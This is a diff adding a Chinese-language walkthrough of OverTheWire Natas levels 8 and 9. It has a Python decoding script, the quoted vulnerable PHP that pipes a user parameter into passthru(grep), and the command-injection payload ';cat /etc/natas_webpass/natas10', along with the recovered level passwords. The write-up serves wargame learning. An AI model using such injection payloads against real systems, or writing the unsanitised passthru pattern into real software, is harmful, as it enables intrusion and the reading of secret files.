@@ -183,4 +183,59 @@ URL:      http://natas8.natas.labs.overthewire.org
     ?>
     ``````
 
-  * 
+  * ``````py
+    import base64
+    
+    hex_str = "3d3d516343746d4d6d6c315669563362"
+    
+    # 将16进制字符串转换为bytes对象（二进制数据）
+    binary_data = bytes.fromhex(hex_str)
+    print(binary_data)
+    temp = binary_data[::-1]
+    print(temp)
+    res = base64.b64decode(temp)
+    print(res)
+    ``````
+  
+    * 获得结果
+      * b'==QcCtmMml1ViV3b'
+        b'b3ViV1lmMmtCcQ=='
+        b'oubWYf2kBq'
+  
+  * 输入oubWYf2kBq
+  
+  * 获得密码Access granted. The password for natas9 is ZE1ck82lmdGIoErlhQgWND6j2Wzz6b6t
+  
+
+## Natas Level 8 → Level 9
+
+```
+Username: natas9
+URL:      http://natas9.natas.labs.overthewire.org
+```
+
+* 提示
+
+  * ``````php
+    Output:
+    <pre>
+    <?
+    $key = "";
+    
+    if(array_key_exists("needle", $_REQUEST)) {
+        $key = $_REQUEST["needle"];
+    }
+    
+    if($key != "") {
+        passthru("grep -i $key dictionary.txt");
+    }
+    ?>
+    </pre>
+    
+    ``````
+
+* 命令注入 ;cat /etc/natas_webpass/natas10 
+
+  * `;`用来做截断
+
+* 获得密码 t7I5VHvpa14sJTUGV0cbEsbYfFP2dmOu
